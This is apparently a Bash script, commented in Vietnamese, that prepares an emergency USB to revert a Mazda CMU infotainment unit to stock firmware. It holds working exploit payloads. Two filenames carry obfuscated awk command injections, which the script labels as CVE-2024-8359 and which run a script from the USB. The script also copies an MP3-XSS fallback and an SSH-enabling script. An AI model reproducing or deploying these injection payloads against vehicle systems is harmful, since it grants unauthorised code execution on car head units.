#!/bin/bash
# ============================================================================
#  make_auto_revert_usb.sh - Script tạo USB Auto-Revert khẩn cấp cho Mazda CMU
#  Tự động khôi phục firmware CMU về nguyên bản zin 100% khi cắm vào xe.
# ============================================================================

set -e

if [ -z "${BASH_VERSION:-}" ]; then
  exec /bin/bash "$0" "$@"
fi

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
REPO_ROOT=$(cd "$SCRIPT_DIR/../.." && pwd)

# Màu hiển thị
if [ -t 1 ]; then
  C_R='\033[31m'; C_G='\033[32m'; C_Y='\033[33m'; C_B='\033[34m'; C_C='\033[36m'
  C_BOLD='\033[1m'; C_DIM='\033[2m'; C_0='\033[0m'
else
  C_R=''; C_G=''; C_Y=''; C_B=''; C_C=''; C_BOLD=''; C_DIM=''; C_0=''
fi

ok()   { printf "%b✓%b %s\n"  "$C_G" "$C_0" "$*"; }
err()  { printf "%b✗%b %s\n"  "$C_R" "$C_0" "$*"; }
warn() { printf "%b!%b %s\n"  "$C_Y" "$C_0" "$*"; }
info() { printf "%b▸%b %s\n"  "$C_C" "$C_0" "$*"; }
hdr()  { echo; printf "%b═══ %s ═══%b\n" "$C_C" "$*" "$C_0"; }

hdr "CÔNG CỤ TẠO USB AUTO-REVERT KHẨN CẤP (MAZDA CMU)"
echo "USB này dùng để khôi phục hoàn toàn Mazda CMU về trạng thái nguyên bản."
echo "Khi cắm USB vào xe, hệ thống sẽ TỰ ĐỘNG gỡ bỏ toàn bộ mod và reboot sau 5 giây."
echo

OS_TYPE=$(uname -s)
TARGET_DEV=""
TARGET_MOUNT=""

# Nếu người dùng truyền sẵn thư mục mount qua đối số (ví dụ: /Volumes/MZD)
if [ -n "${1:-}" ] && [ -d "$1" ]; then
  TARGET_MOUNT="$1"
  ok "Sử dụng thư mục USB được chỉ định: $TARGET_MOUNT"
else
  if [ "$OS_TYPE" != "Darwin" ] && [ "$OS_TYPE" != "Linux" ]; then
    err "Hệ điều hành $OS_TYPE chưa được hỗ trợ. Vui lòng dùng macOS hoặc Linux."
    exit 1
  fi

  info "Đang quét các thiết bị USB ngoài..."
  echo

  if [ "$OS_TYPE" = "Darwin" ]; then
    TMP_DISKS=$(mktemp -t mzdusb) || { err "Không thể tạo file tạm"; exit 1; }
    diskutil list external 2>/dev/null | grep -E '^/dev/disk[0-9]+ \(external' > "$TMP_DISKS" || true

    set --
    N=0
    while IFS= read -r line; do
      [ -z "$line" ] && continue
      id="${line%% *}"
      dev="${id##*/}"
      sz=$(diskutil info "$id" 2>/dev/null | awk -F': *' '/^ *Disk Size/{print $2; exit}')
      name=$(diskutil info "$id" 2>/dev/null | awk -F': *' '/^ *Device \/ Media Name/{print $2; exit}')
      N=$((N+1))
      set -- "$@" "$dev|${sz:-?} — ${name:-USB drive}"
    done < "$TMP_DISKS"
    rm -f "$TMP_DISKS"

    if [ "$N" -eq 0 ]; then
      err "Không tìm thấy ổ USB ngoài nào được cắm vào máy!"
      warn "Hãy cắm USB (>= 512MB) và chạy lại script."
      exit 1
    fi

    echo "Chọn ổ USB để FORMAT và tạo USB Auto-Revert (TOÀN BỘ DỮ LIỆU SẼ BỊ XOÁ):"
    echo
    i=1
    for e in "$@"; do
      d="${e%%|*}"
      l="${e#*|}"
      printf "  %b%d%b  /dev/%-7s  %s\n" "$C_BOLD" "$i" "$C_0" "$d" "$l"
      i=$((i+1))
    done
    printf "  %b0%b  Hủy bỏ\n" "$C_BOLD" "$C_0"
    echo
    printf "> "
    read -r CH
    case "$CH" in
      ""|0) warn "Đã hủy thao tác."; exit 0 ;;
      [1-9]|[1-9][0-9]) : ;;
      *) warn "Lựa chọn không hợp lệ"; exit 1 ;;
    esac

    if [ "$CH" -lt 1 ] || [ "$CH" -gt "$N" ]; then
      warn "Số lựa chọn nằm ngoài phạm vi."
      exit 1
    fi

    eval "SEL=\${$CH}"
    TARGET_DEV="/dev/${SEL%%|*}"
    INFO="${SEL#*|}"

    echo
    warn "CẢNH BÁO: Toàn bộ dữ liệu trên $TARGET_DEV ($INFO) sẽ bị XOÁ SẠCH!"
    printf "Bạn có chắc chắn muốn format ổ này thành FAT32 / MZD không? [y/N] > "
    read -r CONFIRM
    case "$CONFIRM" in y|Y) : ;; *) warn "Đã hủy."; exit 0 ;; esac

    echo
    info "[1/4] Đang unmount $TARGET_DEV..."
    diskutil unmountDisk "$TARGET_DEV" || true

    info "[2/4] Đang format $TARGET_DEV thành FAT32 / MZD (MBR)..."
    if ! diskutil eraseDisk "MS-DOS" MZD MBR "$TARGET_DEV"; then
      err "Format bằng diskutil thất bại!"
      exit 1
    fi

    TARGET_MOUNT="/Volumes/MZD"
    w=0
    while [ ! -d "$TARGET_MOUNT" ] && [ $w -lt 20 ]; do
      sleep 1
      w=$((w+1))
    done

    if [ ! -d "$TARGET_MOUNT" ]; then
      err "Ổ đĩa không tự mount tại $TARGET_MOUNT sau 20s. Vui lòng kiểm tra lại!"
      exit 1
    fi
  else
    # Linux handling
    lsblk -d -o NAME,SIZE,MODEL,TRAN | grep -i usb || true
    echo
    printf "Nhập tên thiết bị USB (ví dụ: sdb, sdc - KHÔNG nhập sda): "
    read -r DEV_NAME
    if [ -z "$DEV_NAME" ] || [ "$DEV_NAME" = "sda" ]; then
      err "Tên thiết bị không hợp lệ!"; exit 1
    fi
    TARGET_DEV="/dev/$DEV_NAME"
    warn "CẢNH BÁO: Bạn sắp xoá toàn bộ $TARGET_DEV!"
    printf "Xác nhận [y/N]: "
    read -r CONFIRM
    case "$CONFIRM" in y|Y) : ;; *) warn "Đã hủy."; exit 0 ;; esac

    umount "${TARGET_DEV}"* 2>/dev/null || true
    parted -s "$TARGET_DEV" mklabel msdos mkpart primary fat32 1MiB 100%
    mkfs.vfat -F 32 -n MZD "${TARGET_DEV}1"
    TARGET_MOUNT="/tmp/mzd_mount_$$"
    mkdir -p "$TARGET_MOUNT"
    mount "${TARGET_DEV}1" "$TARGET_MOUNT"
  fi
fi

ok "Ổ đĩa đích đã sẵn sàng tại: $TARGET_MOUNT"

# -----------------------------------------------------------------------------
# Sao chép các file Auto-Revert
# -----------------------------------------------------------------------------
info "[3/4] Đang sao chép payload Auto-Revert tự động..."

export COPYFILE_DISABLE=1

# 1. File kích hoạt cập nhật tự động
touch "$TARGET_MOUNT/jci-autoupdate"

# 2. Cấu hình chẩn đoán dataRetrieval cho firmware đời cũ (v55-v59)
cat << 'EOF' > "$TARGET_MOUNT/dataRetrieval_config.txt"
CMU_STATUS=no
DATA_PERSIST=no
SCREENSHOT=no
MEMINFO=no
TOP_LOG=no
SMEVENTS=no
NVRAM_DATA=no
THREAD_INFO=no
VUI_LOG=no
GPIO_DATA=no
SETTINGS_BIN=no
SMAPS_VALUE=no
TEST_MODE=no
VUI_ECO_FILES=no
BDS_DATA=no
FLASHINFO=no
SCI_LOG=no
LOG_TIMEOUT=180
TMP_FILTER=
CMD_LINE=sh /mnt/sd*/auto-revert.sh
EOF

# 3. Script khôi phục auto-revert.sh
cp -f "$SCRIPT_DIR/auto-revert.sh" "$TARGET_MOUNT/auto-revert.sh"
chmod +x "$TARGET_MOUNT/auto-revert.sh" 2>/dev/null || true

# 4. Trampoline `t` cho lỗ hổng CVE-2024-8359 gọi thẳng auto-revert.sh
cat << 'EOF' > "$TARGET_MOUNT/t"
#!/bin/sh
mkdir /tmp/hud-up-lock 2>/dev/null || exit 0
trap 'rmdir /tmp/hud-up-lock 2>/dev/null' EXIT
MYDIR=$(dirname "$0")
for p in "$MYDIR/auto-revert.sh" "/mnt/sd*1/auto-revert.sh" "/tmp/mnt/sd*1/auto-revert.sh"; do
  for f in $p; do
    if [ -f "$f" ]; then
      exec sh "$f"
    fi
  done
done
EOF
chmod +x "$TARGET_MOUNT/t" 2>/dev/null || true

# 5. Cầu nối tweaks.sh dự phòng
cat << 'EOF' > "$TARGET_MOUNT/tweaks.sh"
#!/bin/sh
MYDIR=$(dirname "$(readlink -f "$0" 2>/dev/null || echo "$0")")
if [ -f "$MYDIR/auto-revert.sh" ]; then
  exec sh "$MYDIR/auto-revert.sh"
fi
EOF
chmod +x "$TARGET_MOUNT/tweaks.sh" 2>/dev/null || true

# 6. Script bật SSH khẩn cấp dự phòng (s)
cp -f "$SCRIPT_DIR/s" "$TARGET_MOUNT/s" 2>/dev/null || true

# 7. File MP3-XSS dự phòng (nếu autoupdate bị tắt)
cp -f "$SCRIPT_DIR/mp3title.txt" "$TARGET_MOUNT/" 2>/dev/null || true
cp -f "$SCRIPT_DIR/dev.html"     "$TARGET_MOUNT/" 2>/dev/null || true
mkdir -p "$TARGET_MOUNT/mp3" "$TARGET_MOUNT/js" "$TARGET_MOUNT/css"
cp -rf "$SCRIPT_DIR/mp3/"*.mp3   "$TARGET_MOUNT/mp3/" 2>/dev/null || true
cp -rf "$SCRIPT_DIR/mp3/"*.mp3   "$TARGET_MOUNT/"     2>/dev/null || true
cp -rf "$SCRIPT_DIR/js/"*        "$TARGET_MOUNT/js/"  2>/dev/null || true
cp -rf "$SCRIPT_DIR/css/"*       "$TARGET_MOUNT/css/" 2>/dev/null || true

# 8. Tạo 2 file .up khai thác lỗ hổng CVE-2024-8359
info "Đang tạo payload CVE-2024-8359 (.up command injection)..."
UP_MNT='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'
UP_TMP='$(awk -v f=%c '"'"'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system(sprintf(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116))}'"'"').up'

: > "$TARGET_MOUNT/${UP_MNT}"
: > "$TARGET_MOUNT/${UP_TMP}"

# Dọn dẹp metadata rác của macOS
find "$TARGET_MOUNT" \( -name '._*' -o -name '.DS_Store' -o -name '.Trashes' \
                     -o -name '.Spotlight-V100' -o -name '.fseventsd' \) \
     -exec rm -rf {} + 2>/dev/null || true

sync

# -----------------------------------------------------------------------------
# Hoàn tất
# -----------------------------------------------------------------------------
info "[4/4] Kiểm tra danh sách file trên USB Auto-Revert..."
echo
ls -la "$TARGET_MOUNT" | sed 's/^/  /'
echo

if [ -n "$TARGET_DEV" ]; then
  if [ "$OS_TYPE" = "Darwin" ]; then
    diskutil unmountDisk "$TARGET_DEV" || true
  else
    umount "$TARGET_MOUNT" 2>/dev/null || true
    rmdir "$TARGET_MOUNT" 2>/dev/null || true
  fi
fi

ok "======================================================================"
ok "TẠO USB AUTO-REVERT THÀNH CÔNG!"
ok "----------------------------------------------------------------------"
ok "Cách sử dụng khi xe gặp sự cố:"
ok "1. Cắm USB này vào cổng USB 1 trên xe Mazda."
ok "2. Chờ 10-20 giây: Hệ thống tự động gỡ sạch mod và khôi phục hệ thống zin."
ok "3. Màn hình sẽ báo 'AUTO-REVERT COMPLETE' và tự reboot xe sau 5 giây."
ok "======================================================================"
